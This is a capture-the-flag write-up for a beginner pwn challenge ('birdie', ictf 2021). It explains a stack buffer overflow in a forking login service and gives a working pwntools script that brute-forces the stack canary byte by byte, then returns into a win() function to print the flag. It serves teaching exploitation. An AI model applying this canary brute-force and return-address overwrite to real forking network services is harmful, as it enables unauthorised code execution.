---
title: ictf - A little birdie once told me... (pwn)
date: 2021-05-31T00:00:00Z
draft: false
description: brute force canary, fork
tocOpen: true
---

I thought this was a good challenge so I decided to do a writeup on it. This challenge was from ictf 2021 May batch of challenges.

ictf is a discord server to get daily CTF (Capture the Flag) challenges aimed mostly towards beginners (with occasional difficult challenges). Moreover, no sign-up is required, everything is on discord.

## Overview

> If at first you don't succeed, try try again... Connect with nc 140.238.222.141 42000.
>
> Attachments: [birdie](attachments/birdie)

## Overview
---

Looking at the `checksec` of the binary, we see that all protections except PIE is green.

```
➜ checksec birdie

[*] '/media/sf_dabian/Challenges/ictf/10/birdiee/birdie'

   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```

Connecting to the service, we are prompted for a password, keying in `aaa` returns `WRONG!`

```
➜ nc 140.238.222.141 42000
Welcome!
Please enter the password: aaa
WRONG!
```

Decompiling our binary, we get the following source code which I added some comments to:

```c
void __noreturn win()
{

  stream = fopen("flag.txt", "r");
  if ( !stream )
    exit(1);
  if ( !fgets(s, 60, stream) )
    exit(1);
  puts(s);
  exit(0);
}

unsigned int login()
{
  __int64 *v0;
  char v2;
  __int64 *v3;
  __int64 v4[5];
  unsigned __int64 v5;

  v4[0] = 0LL;
  v4[1] = 0LL;
  v4[2] = 0LL;
  v4[3] = 0LL;
  v4[4] = 0LL;
  v3 = v4;

  printf("Please enter the password: ");
  fflush(_bss_start);
  while ( 1 )
  {
    v2 = getchar();
    if ( v2 == -1 )                             // if null
    {
      puts("Goodbye");
      exit(0);
    }
    if ( v2 == 10 )                             // newline character ignored
      break;
    v0 = v3;
    v3 = (int *)((char *)v3 + 1);
    *(_BYTE *)v0 = v2;                          // otherwise *v0[i] = getchar()
  }
  puts("WRONG!");
  return 0;
}

int main()
{
  int stat_loc;
  int fd;
  __pid_t pid;

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);                      // we are writing into _bss_start
  alarm(0x4B0u);
  signal(14, timeout);                          // sigalarm

  fd = open("/dev/null", 1);
  if ( fd == -1 )
    exit(1);
  if ( dup2(fd, 2) == -1 )                      // random gibberish
    exit(1);
  puts("Welcome!");                             // Welcome!
  while ( 1 )                                   // endless loop
  {
    pid = fork();                               // used for creating a new process, which is called child process
    if ( pid < 0 )                              // pid<0 : creation of a child process was unsuccessful.
      break;
    if ( !pid )                                 // Returned to the newly created child process.
    {
      login();                                  // login() in fork
      exit(0);                                  // exit fork
    }
    if ( waitpid(pid, &stat_loc, 0) < 0 )
      exit(1);
    if ( (char)((stat_loc & 0x7F) + 1) >> 1 > 0 )
      puts("SQUAWK!");                          // SQUAWK!
  }
  exit(1);
}
```

Okay, let's move on to the real deal...

<br>

## Pre-Exploitation
---

#### Fuzz

Even though this program may look a little complex at first, we can slowly fuzz and break it down easily.

Interestingly, if we fuzz the remote service and send a longer input, we will get a different output than intended!

```
➜ nc 140.238.222.141 42000

Welcome!
Please enter the password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
WRONG!
SQUAWK!
```

If we send a _sort-of_ de-brujin sequence to find the number of characters it takes to print `SQUAWK!`, we find that sending anything more than 40 characters causes a `SQUAWK!`.

```
➜ nc 140.238.222.141 42000

Welcome!

Please enter the password: 1234567890123456789012345678901234567890 (len 40)
WRONG!

Please enter the password: 12345678901234567890123456789012345678901 (len 41)
WRONG!
SQUAWK!
```

<br>

#### Main

Okay, let's set that aside and understand what is going on in the program.

```c
puts("Welcome!");                             // Welcome!
while ( 1 )                                   // endless loop
{
  pid = fork();                               // used for creating a new process, which is called child process
  if ( pid < 0 )                              // pid<0 : creation of a child process was unsuccessful.
    break;
  if ( !pid )                                 // Returned to the newly created child process.
  {
    login();                                  // login() in fork
    exit(0);                                  // exit fork
  }
  if ( waitpid(pid, &stat_loc, 0) < 0 )
    exit(1);
  if ( (char)((stat_loc & 0x7F) + 1) >> 1 > 0 )
    puts("SQUAWK!");                          // SQUAWK!
}

```

First, this program outputs `Welcome!`, and then it `fork()` a service. Let's look at what `fork()` does with `man fork`.

> fork() creates a new process by duplicating the calling process.  The new process is referred to as the child process.  The calling process is referred to as the parent process.
>
> The child process is an exact duplicate of the parent process
>
> On  success,  the PID of the child process is returned in the parent, and 0 is returned in the child.  On failure, -1 is returned in the parent, no child process is created, and errno is set appropriately.

It is apparent that this program checks the return value of `fork()` and if the `fork()` was unsuccessful, the program terminates. Otherwise, forked process will call `login()` and then `exit(0)` shortly after.

<br>

#### Login

```c
__int64 v4[5];
unsigned __int64 v5;

v4[0] = 0LL;
v4[1] = 0LL;
v4[2] = 0LL;
v4[3] = 0LL;
v4[4] = 0LL;
v3 = v4;
```

In the `login()` program, we see that an array `v4[5]` is declared and `v3 = v4`.

```c
printf("Please enter the password: ");
fflush(_bss_start);
while ( 1 )
{
  v2 = getchar();
  if ( v2 == -1 )                             // if null
  {
    puts("Goodbye");
    exit(0);
  }
  if ( v2 == 10 )                             // newline character ignored
    break;
  v0 = v3;
  v3 = (int *)((char *)v3 + 1);
  *(_BYTE *)v0 = v2;                          // otherwise *v0[i] = getchar()
}
puts("WRONG!");
return 0;
```

`login()` then prompts for a password and takes in a single character with `getchar()` into `v2`.

If our input is not `null` or `\n`, it then sets `v0 = v3`. For each loop, it increments `v3` by 1 and `v2` is written into `v0`.

In a nutshell, the program is something like this

```c
while (1)
{
v2 = getchar()
v0 = v3
v3 = v3 + 1
*v0 = v2                                       // VULNERABLE!!!
}
```

If you haven't noticed where the vulnerability is, `v3` is an array of size 5, but we can write as much as we want! We have a **buffer overflow**.

However, there is still an unknown canary and since we do not have a leak, we are unable to overflow anything yet. There is still the mystery of **SQUAWK!**. Let's return to `main()`.

<br>

#### Return to main

After the fork program exits, it returns to `main()` and continues to complete the loop.

```c
if ( waitpid(pid, &stat_loc, 0) < 0 )
  exit(1);
if ( (char)((stat_loc & 0x7F) + 1) >> 1 > 0 )
  puts("SQUAWK!");                          // SQUAWK!
```

I'm not too sure what `waitpid()` means but let's have a look at it in man page.

>         waitpid(-1, &wstatus, 0);
>
> The waitpid() system call suspends execution of the calling thread until a child specified by pid argument has changed state.  By default, waitpid() waits only for terminated children, but this behavior is modifiable via the options argument, as described below.
>
>  If  wstatus  is  not  NULL, wait() and waitpid() store status information in the int to which it points.  This integer can be inspected with the following macros (which take the integer itself as an argument, not a pointer to it, as is done  in  wait()  and waitpid()!):

Basically, `&stat_loc` in our case returns the status of the forked program. I'm not sure of the values as I am too lazy to open up my eglibc source to look at the `#define`. If you know where I can find the integer values for each `&wstatus` signal, let me know!

But with some thinking, we can guess that it **SQUAWK!** because it hits a canary and the fork terminates. This means that if we can replace the canary byte by byte, it will not print SQUAWK!

Also since we get an unlimited size of input, we can easily brute force our canary. We send a byte from the whole byte range `0xff` until we do not get **SQUAWK**. And then repeat it for all 8 bytes of the canary including the distinctive null byte of a canary.

<br>

## Exploitation!
---

Now, we can put together all our pieces to exploit the program. As soon as we can find our canary, we can easily overwrite the return address with `win()` and get the flag.  

```py
from pwn import *
with context.quiet:
    context.binary = elf = ELF('birdie')
    #p = remote('140.238.222.141', 42000)
    p = process('./birdie')

payload = cyclic(40)
canary = b''
print("")
splash()
print("")

#: STAGE1
with log.progress("brute forcing canary") as pro:
    while True:
        for i in [i.to_bytes(1, 'big') for i in range(0xff)]:
            if i == b'\n': continue
            p.sendline(payload + canary + i)
            p.recvuntil(b'WRONG!\n')
            receive = p.recvuntil(b'Please enter the password: ')
            pro.status(f" {len(canary)}/8 - {canary + i}")
            if b'SQUAWK' in receive:
                pass
            else:
                canary += i
                break
        if len(canary)==8:
            break
    log.success(f'Canary is {canary} of length {len(canary)}')

#: STAGE2
p.sendline(flat({ 40:canary, 56: p64(elf.sym.win) }))
p.recvline()
log.success(f'flag is {p.recvline().strip()}')
```

Let's watch this in action!


<script id="asciicast-kAmjXGbTycEhAap6tOO7NZFLl" src="https://asciinema.org/a/kAmjXGbTycEhAap6tOO7NZFLl.js" async></script>

```
ictf{d0nt_$m@sh_m3_1ll_s1ng_l1k3_@_can@ry!}
```
